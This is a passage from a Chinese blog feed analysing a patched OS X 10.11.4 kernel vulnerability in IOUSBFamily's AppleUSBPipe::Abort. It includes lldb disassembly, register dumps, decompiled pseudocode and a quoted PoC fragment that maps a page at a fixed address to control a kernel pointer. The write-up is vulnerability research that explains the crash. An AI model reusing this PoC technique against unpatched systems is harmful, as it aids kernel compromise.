<li>是在应用层程序调用IOUSBFamily的36号方法，<code>_AbortStreamsPipe</code>时触发的漏洞。</li>
<li><code>_AbortStreamsPipe</code>又调用了<code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>函数。</li>
<li><code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>函数最后调用了<code>AppleUSBPipe::Abort</code>并触发了函数的崩溃。</li>
</ul>
<h2 id="2-2_崩溃原因">2.2 崩溃原因</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  	<span class="number">0</span>xffffff7f91b1155f &lt;+<span class="number">119</span>&gt;: callq  <span class="number">0</span>xffffff80112ecc50        ; kprintf at pe_kprintf.c:<span class="number">105</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b11564 &lt;+<span class="number">124</span>&gt;: testl  %r14d, %r14d</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11567 &lt;+<span class="number">127</span>&gt;: je     <span class="number">0</span>xffffff7f91b115a8        ; &lt;+<span class="number">192</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b11569 &lt;+<span class="number">129</span>&gt;: movl   %r14d, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1156c &lt;+<span class="number">132</span>&gt;: movq   <span class="number">0</span>x88(%rbx), %rcx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11573 &lt;+<span class="number">139</span>&gt;: movq   (%rcx,%rax,<span class="number">8</span>), %rdi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11577 &lt;+<span class="number">143</span>&gt;: movl   <span class="variable">$0xe00002f0</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1157c &lt;+<span class="number">148</span>&gt;: testq  %rdi, %rdi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1157f &lt;+<span class="number">151</span>&gt;: je     <span class="number">0</span>xffffff7f91b115c9        ; &lt;+<span class="number">225</span>&gt; at AppleUSBPipe.cpp:<span class="number">1187</span></span><br><span class="line">-&gt;  <span class="number">0</span>xffffff7f91b11581 &lt;+<span class="number">153</span>&gt;: movq   (%rdi), %rax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11584 &lt;+<span class="number">156</span>&gt;: xorl   %esi, %esi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11586 &lt;+<span class="number">158</span>&gt;: movl   <span class="variable">$0xe00002eb</span>, %edx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1158b &lt;+<span class="number">163</span>&gt;: xorl   %ecx, %ecx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1158d &lt;+<span class="number">165</span>&gt;: callq  *<span class="number">0</span>x178(%rax)</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11593 &lt;+<span class="number">171</span>&gt;: cmpl   <span class="variable">$0xe00002d6</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11598 &lt;+<span class="number">176</span>&gt;: je     <span class="number">0</span>xffffff7f91b115b6        ; &lt;+<span class="number">206</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b1159a &lt;+<span class="number">178</span>&gt;: cmpl   <span class="variable">$0xe0005001</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1159f &lt;+<span class="number">183</span>&gt;: jne    <span class="number">0</span>xffffff7f91b115bd        ; &lt;+<span class="number">213</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b115a1 &lt;+<span class="number">185</span>&gt;: movl   <span class="variable">$0xe000405d</span>, %eax</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) register <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0</span>x00000000e00002f0</span><br><span class="line">       rbx = <span class="number">0</span>xffffff801c1a6100</span><br><span class="line">       rcx = <span class="number">0</span>x0000000000000000</span><br><span class="line">       rdx = <span class="number">0</span>xffffff801779f6e0</span><br><span class="line">       rdi = <span class="number">0</span>x4141414141414141</span><br><span class="line">       rsi = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rbp = <span class="number">0</span>xffffff887b613b20</span><br><span class="line">       rsp = <span class="number">0</span>xffffff887b613ae0</span><br><span class="line">        r8 = <span class="number">0</span>x0000000000000000</span><br><span class="line">        r9 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r10 = <span class="number">0</span>xffffff7f91b408a1  <span class="string">""</span></span><br><span class="line">       r11 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r12 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r13 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r14 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       r15 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rip = <span class="number">0</span>xffffff7f91b11581  IOUSBFamily`AppleUSBPipe::Abort(unsigned int) + <span class="number">153</span> at AppleUSBPipe.cpp:<span class="number">1181</span></span><br><span class="line">    rflags = <span class="number">0</span>x0000000000010206</span><br><span class="line">        cs = <span class="number">0</span>x0000000000000008</span><br><span class="line">        fs = <span class="number">0</span>x0000000000000000</span><br><span class="line">        gs = <span class="number">0</span>x0000000000000000</span><br></pre></td></tr></table></figure>
<p>崩溃的指令是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;  <span class="number">0</span>xffffff7f91b11581 &lt;+<span class="number">153</span>&gt;: movq   (%rdi), %rax</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x000000000002c581         mov        rax, qword [ds:rdi]</span><br></pre></td></tr></table></figure>
<p>对AT&amp;T格式汇编不熟悉的可以看第二行的汇编代码，他们是一样的。<br><code>$rdi</code>的值为<code>0x4141414141414141</code>,而该指令试图读取地址为<code>0x4141414141414141</code>出的值并复制给<code>$rax</code>，所以就崩溃了。</p>
<h1 id="0x03_IOUSBFamily代码分析">0x03 IOUSBFamily代码分析</h1><p>通过结合动态分析与静态分析，给出分析后的伪代码。分析过程略过,都是体力活。</p>
<h2 id="3-1_IOUSBInterfaceUserClient::_AbortStreamsPipe">3.1 IOUSBInterfaceUserClient::_AbortStreamsPipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall IOUSBInterfaceUserClient::_AbortStreamsPipe(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 _a3; <span class="comment">// r14@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er15@2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er12@2</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl@5</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@5</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+10h] [bp-40h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+1Ch] [bp-34h]@2</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+20h] [bp-30h]@2</span></span><br><span class="line"></span><br><span class="line">  _a3 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">436</span>) &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    clock_get_system_microtime(&amp;v13, &amp;v12);</span><br><span class="line">    v4 = *(_DWORD *)(a1 + <span class="number">436</span>);</span><br><span class="line">    v11 = v13;</span><br><span class="line">    v5 = v12;</span><br><span class="line">    LODWORD(v6) = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + <span class="number">904L</span>L))(a1, <span class="number">0L</span>L);</span><br><span class="line">    v7 = v6;</span><br><span class="line">    LODWORD(v8) = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + <span class="number">952L</span>L))(a1, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &amp; <span class="number">0x10000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a2 = v11;</span><br><span class="line">      kprintf(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v11, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5, v7, v8, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a2 = v11;</span><br><span class="line">      IOLog(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v11, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5, v7, v8, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = (*(<span class="keyword">int</span> (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + <span class="number">2488L</span>L))(a1, a2);</span><br><span class="line">  result = -<span class="number">536870174</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )                                     <span class="comment">// this-&gt;AbortStreamsPipe(this,0x00000000,0xf0f0f0f0)</span></span><br><span class="line">    result = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD, _QWORD))(*(_QWORD *)a1</span><br><span class="line">                                                            + <span class="number">0xB58</span>LL))(<span class="comment">// call abortstreamspipe </span></span><br><span class="line">                                                <span class="comment">// get function from this+0xb58</span></span><br><span class="line">               a1,                              <span class="comment">// this</span></span><br><span class="line">               **(_BYTE **)(_a3 + <span class="number">0x20</span>),        <span class="comment">// (lldb) x $rcx</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ab0: 00 00 00 00 00 00 00 00 f0 f0 f0 f0 00 00 00 00  ........????....</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ac0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span><br><span class="line">               *(_DWORD *)(*(_QWORD *)(_a3 + <span class="number">0x20</span>) + <span class="number">8L</span>L));<span class="comment">// (lldb) x $rcx+0x8</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ab8: f0 f0 f0 f0 00 00 00 00 00 00 00 00 00 00 00 00  ????............</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ac8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的逻辑非常简单，就是根据收到的参数处理后调用了<code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>函数，每一个参数已经在注释中体现了。</p>
<h2 id="3-2IOUSBInterfaceUserClient::AbortStreamsPipe">3.2IOUSBInterfaceUserClient::AbortStreamsPipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall IOUSBInterfaceUserClient::AbortStreamsPipe(IOUSBInterfaceUserClient *<span class="keyword">this</span>, <span class="keyword">unsigned</span> __int8 a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> steamID; <span class="comment">// er15@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 _a2; <span class="comment">// r12@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er15@2</span></span><br><span class="line">  __int64 v6; <span class="comment">// r12@2</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// er13@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v9; <span class="comment">// r14@2</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret; <span class="comment">// er14@6</span></span><br><span class="line">  OSMetaClassBase *_p_pipe_obj; <span class="comment">// rax@8</span></span><br><span class="line">  <span class="keyword">const</span> OSMetaClass *v13; <span class="comment">// rdx@8</span></span><br><span class="line">  OSMetaClassBase *__p_pipe_obj; <span class="comment">// rbx@8</span></span><br><span class="line">  _QWORD *_p_usb_pipe; <span class="comment">// rax@9</span></span><br><span class="line">  <span class="keyword">int</span> _ret; <span class="comment">// eax@10</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// [sp+18h] [bp-38h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [sp+1Ch] [bp-34h]@2</span></span><br><span class="line">  __int64 v20; <span class="comment">// [sp+20h] [bp-30h]@2</span></span><br><span class="line"></span><br><span class="line">  steamID = a3;                                 <span class="comment">// 0xf0f0f0f0</span></span><br><span class="line">  _a2 = a2;                                     <span class="comment">// 0x00000000</span></span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)<span class="keyword">this</span> + <span class="number">0x1B4</span>) &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = a3;</span><br><span class="line">    clock_get_system_microtime(&amp;v20, &amp;v19);</span><br><span class="line">    v5 = *((_DWORD *)<span class="keyword">this</span> + <span class="number">0x6D</span>);</span><br><span class="line">    v6 = v20;</span><br><span class="line">    v7 = v19;</span><br><span class="line">    LODWORD(v8) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0x388</span>LL))(<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">    v9 = v8;</span><br><span class="line">    LODWORD(v10) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0x3B8</span>LL))(<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &amp; <span class="number">0x10000</span> )</span><br><span class="line">      kprintf(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, v9, v10, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      IOLog(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, v9, v10, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    steamID = v18;</span><br><span class="line">    _a2 = a2;</span><br><span class="line">  &#125;</span><br><span class="line">  ret = <span class="number">0xE00002D9</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">0x37</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)IOService::isInactive(<span class="keyword">this</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(_p_pipe_obj) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0xA68</span>LL))(</span><br><span class="line">                               <span class="keyword">this</span>,</span><br><span class="line">                               _a2);            <span class="comment">// IOUSBInterfaceUserClient::GetPipeObj</span></span><br><span class="line">      __p_pipe_obj = _p_pipe_obj;</span><br><span class="line">      ret = <span class="number">0xE0004061</span>;</span><br><span class="line">      <span class="keyword">if</span> ( _p_pipe_obj )</span><br><span class="line">      &#123;</span><br><span class="line">        _p_usb_pipe = (_QWORD *)OSMetaClassBase::safeMetaCast(</span><br><span class="line">                                  _p_pipe_obj,</span><br><span class="line">                                  (<span class="keyword">const</span> OSMetaClassBase *)IOUSBPipeV2::metaClass,</span><br><span class="line">                                  v13);</span><br><span class="line">        <span class="keyword">if</span> ( _p_usb_pipe )</span><br><span class="line">          _ret = (*(<span class="keyword">int</span> (__fastcall **)(_QWORD *, _QWORD))(*_p_usb_pipe + <span class="number">0x278</span>LL))(_p_usb_pipe, steamID);<span class="comment">// AppleUSBPipe::Abort(UInt32 streamID)</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _ret = (*(<span class="keyword">int</span> (__fastcall **)(OSMetaClassBase *, _QWORD))(*(_QWORD *)__p_pipe_obj + <span class="number">0x128</span>LL))(</span><br><span class="line">                   __p_pipe_obj,</span><br><span class="line">                   IOUSBPipeV2::metaClass);</span><br><span class="line">        ret = _ret;</span><br><span class="line">        (*(<span class="keyword">void</span> (__fastcall **)(OSMetaClassBase *))(*(_QWORD *)__p_pipe_obj + <span class="number">0x28</span>LL))(__p_pipe_obj);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用<code>AppleUSBPipe::Abort</code></p>
<h2 id="3-3_AppleUSBPipe::Abort">3.3 AppleUSBPipe::Abort</h2><p>这个函数看汇编代码更容易理解一些<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">0</span>x000000000002c569         mov        eax, r14d</span><br><span class="line"><span class="number">0</span>x000000000002c56c         mov        rcx, qword [ds:rbx+<span class="number">0</span>x88]</span><br><span class="line"><span class="number">0</span>x000000000002c573         mov        rdi, qword [ds:rcx+rax*<span class="number">8</span>]</span><br><span class="line"><span class="number">0</span>x000000000002c577         mov        eax, <span class="number">0</span>xe00002f0</span><br><span class="line"><span class="number">0</span>x000000000002c57c         <span class="built_in">test</span>       rdi, rdi</span><br><span class="line"><span class="number">0</span>x000000000002c57f         je         <span class="number">0</span>x2c5c9</span><br><span class="line"></span><br><span class="line">-&gt;<span class="number">0</span>x000000000002c581         mov        rax, qword [ds:rdi]</span><br><span class="line"><span class="number">0</span>x000000000002c584         xor        esi, esi</span><br><span class="line"><span class="number">0</span>x000000000002c586         mov        edx, <span class="number">0</span>xe00002eb</span><br><span class="line"><span class="number">0</span>x000000000002c58b         xor        ecx, ecx</span><br><span class="line"><span class="number">0</span>x000000000002c58d         call       qword [ds:rax+<span class="number">0</span>x178]</span><br><span class="line"><span class="number">0</span>x000000000002c593         cmp        eax, <span class="number">0</span>xe00002d6</span><br><span class="line"><span class="number">0</span>x000000000002c598         je         <span class="number">0</span>x2c5b6</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>各个寄存器的值如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) register <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0</span>x00000000e00002f0</span><br><span class="line">       rbx = <span class="number">0</span>xffffff801c1a6100</span><br><span class="line">       rcx = <span class="number">0</span>x0000000000000000</span><br><span class="line">       rdx = <span class="number">0</span>xffffff801779f6e0</span><br><span class="line">       rdi = <span class="number">0</span>x4141414141414141</span><br><span class="line">       rsi = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rbp = <span class="number">0</span>xffffff887b613b20</span><br><span class="line">       rsp = <span class="number">0</span>xffffff887b613ae0</span><br><span class="line">        r8 = <span class="number">0</span>x0000000000000000</span><br><span class="line">        r9 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r10 = <span class="number">0</span>xffffff7f91b408a1  <span class="string">""</span></span><br><span class="line">       r11 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r12 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r13 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r14 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       r15 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rip = <span class="number">0</span>xffffff7f91b11581  IOUSBFamily`AppleUSBPipe::Abort(unsigned int) + <span class="number">153</span> at AppleUSBPipe.cpp:<span class="number">1181</span></span><br><span class="line">    rflags = <span class="number">0</span>x0000000000010206</span><br><span class="line">        cs = <span class="number">0</span>x0000000000000008</span><br><span class="line">        fs = <span class="number">0</span>x0000000000000000</span><br><span class="line">        gs = <span class="number">0</span>x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>当执行到这里时，因为rax是应用层传入的参数<code>0xf0f0f0f0</code>,而rcx的值是<code>0x0000000000000000</code>,所以根据rax的不同，rdi的值会是一个从<code>0x0000000000000000</code>地址开始偏移量是IOUSBInterfaceUserClient::AbortStreamsPipe函数中的SteamID，也就是POC中的<code>0xf0f0f0f0</code>乘以<code>8LL</code>之后获得的所得地址所指向的内存处的值。</p>
<p>因为<code>0xf0f0f0f0</code>是一个POC中可控值，所以<code>0x000000000002c573         mov        rdi, qword [ds:rcx+rax*8]</code>是一个从0x0000000000000000地址开始任意偏移量的任意读取。<br>因为0xf0f0f0f0*0x8=0x787878780,结合POC中代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">map_payload</span><span class="params">(uint64_t target_rip)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span>*** obj_ptr_ptr = (<span class="keyword">void</span>*)<span class="number">0x0000000787878780</span>;</span><br><span class="line">  <span class="keyword">void</span>* request           = (<span class="keyword">void</span>*)<span class="number">0x0000000787878000</span>;</span><br><span class="line">  <span class="keyword">void</span>* page = mmap(request, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request != page) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"MAP_FIXED didn't give us the right page\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span>*)page, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从地址0x0000000787878000开始一直到0x0000000787878000+0x1000处所有的值都为0x41。<br>所以rdi寄存器的值为0x4141414141414141，从而导致了POC执行时出现崩溃。</p>
<p>至此POC分析完毕。</p>
<h1 id="3-4_小结">3.4 小结</h1><p>调试poc花了一些时间，陷入了各种代码实现的分析，和做开发时一样，调bug时需要注重崩溃的现场，分析的过程中经常埋头分析了一大通之后发现得到的信息在崩溃现场已经有了，甚至还有一些分析过程中想不通的问题，在崩溃的现场也已经有线索了。</p>
<h1 id="reference">reference</h1><p>1.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X Kernel code execution due to lack of bounds checking in AppleUSBPipe::Abort</a></p>
<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/" target="_blank" rel="external">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><code>OS X</code>系统的10.11.4的系统补丁中修复了一个在内核中可以导致代码执行的漏洞，漏洞形成的原因是缺少了必要的边界值检测。</p>
<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id">最初的漏洞报告</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=227076">POC下载</a><br>本文记录了对POC的简单的调试和分析，对该漏洞有一个初步的认识，为后续的研究做好准备工作。</li>
</ul>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
      <category term="OS X" scheme="http://yoursite.com/tags/OS-X/"/>
    
      <category term="bounds checking" scheme="http://yoursite.com/tags/bounds-checking/"/>
    
      <category term="kernel" scheme="http://yoursite.com/tags/kernel/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://yoursite.com/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1757利用程序分析]]></title>
    <link href="http://yoursite.com/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/04/19/CVE-2016-1757利用程序分析/</id>
    <published>2016-04-19T18:49:14.000Z</published>
